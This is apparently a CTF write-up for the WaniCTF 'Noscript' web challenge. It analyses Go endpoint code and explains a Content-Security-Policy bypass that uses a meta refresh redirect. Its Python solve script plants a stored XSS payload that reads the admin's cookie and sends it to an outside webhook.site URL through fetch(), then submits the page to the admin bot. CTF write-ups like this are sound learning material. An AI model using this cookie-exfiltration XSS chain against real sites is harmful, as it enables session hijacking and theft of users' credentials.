https://ctftime.org/event/2377
# Noscript (Web)

Ignite it to steal the cookie!

https://web-noscript-lz56g6.wanictf.org/

## Analysis
We have webpage where we are supposed to trigger XSS and steal the cookie from admin, but we need to bypass CSP. There are few endpoints:
 
- `/report`
- `/signin`
- `/user/:id`
- `/username/:id`

```go
r.GET("/user/:id", func(c * gin.Context) {
  c.Header("Content-Security-Policy",
    "default-src 'self', script-src 'none'")
  id: = c.Param("id")
  re: = regexp.MustCompile(
    "^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$"
  )
  if re.MatchString(id) {
    if val, ok: = db.Get(id);
    ok {
      params: = map[string] interface {} {
        "id": id,
        "username": val[0],
          "profile": template.HTML(val[1]),
      }
      c.HTML(http.StatusOK, "user.html", params)
    } else {
      _, _ = c.Writer.WriteString(
        "<p>user not found <a href='/'>Home</a></p>")
    }
  } else {
    _, _ = c.Writer.WriteString("<p>invalid id <a href='/'>Home</a></p>")
  }
})
```

We see that CSP rule is set for this endpoint, so we can't trigger JS execution, but we can use `<meta>` refresh tag to navigate to `/username/:id` which is basically same endpoint just without CSP in place:

```go
r.GET("/username/:id", func(c * gin.Context) {
  id: = c.Param("id")
  re: = regexp.MustCompile(
    "^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3}-[a-fA-F0-9]{12}$"
  )
  if re.MatchString(id) {
    if val, ok: = db.Get(id);
    ok {
      _, _ = c.Writer.WriteString(val[0])
    } else {
      _, _ = c.Writer.WriteString(
        "<p>user not found <a href='/'>Home</a></p>")
    }
  } else {
    _, _ = c.Writer.WriteString("<p>invalid id <a href='/'>Home</a></p>")
  }
})
```

## Solution

So idea is just to create first note with our XSS payload via username field, then create another note with meta refresh tag payload via `profile` field - for navigation to the first note but with `/username/:id` since ids of notes are stored our XSS will trigger on the endpoint where there is no CSP. 

```python
import requests
import urllib.parse

first = "https://web-noscript-lz56g6.wanictf.org/signin"


p1 = requests.post(first)

note1 = p1.url

# fetch get payload  
fpayload = """<script>
    document.addEventListener('DOMContentLoaded', function() {
        function getCookieValue(name) {
            const value = `; ${document.cookie}`;
            const parts = value.split(`; ${name}=`);
            if (parts.length === 2) return parts.pop().split(';').shift();
        }

        var flagCookieValue = getCookieValue('flag');
        fetch('https://webhook.site/79772fdd-c167-4829-a53c-ba6d3c5fcae6?cookie=' + encodeURIComponent(flagCookieValue), {
            method: 'GET',
            mode: 'no-cors',
            credentials: 'include'
        }).then(response => {
            console.log('Fetch response:', response);
        }).catch(error => {
            console.error('Fetch error:', error);
        });
    });
</script>"""

form_data1 = { "username": fpayload, "profile":"asdfg1"} 

r2 = requests.post(f"{note1}", data=form_data1)

parsed_url = urllib.parse.urlparse(r2.url)

path_parts = parsed_url.path.split('/')
path_parts[1] = 'username'  # Replace 'user' with 'username'
new_path = '/'.join(path_parts)

# Construct the new URL with the modified path
new_url = urllib.parse.urlunparse(('http', 'app:8080', new_path, '', '', ''))
p2 = requests.post(first)

payload2 = f"<meta http-equiv='refresh' content='0;url={new_url}'>"

form_data2 = {"username": "foo", "profile": payload2}

note2 = p2.url

for_admin = urllib.parse.urlparse(note2).path

p3 = requests.post(f"{note2}", data=form_data2)

# send to admin
form_data3 = {"url": for_admin}
send_to_admin = requests.post("https://web-noscript-lz56g6.wanictf.org/report", data=form_data3)

print("Admin response: ", send_to_admin.text)
```

## Flag
`FLAG{n0scr1p4_c4n_be_d4nger0us}`

github.com/0xhebi 2024/06/22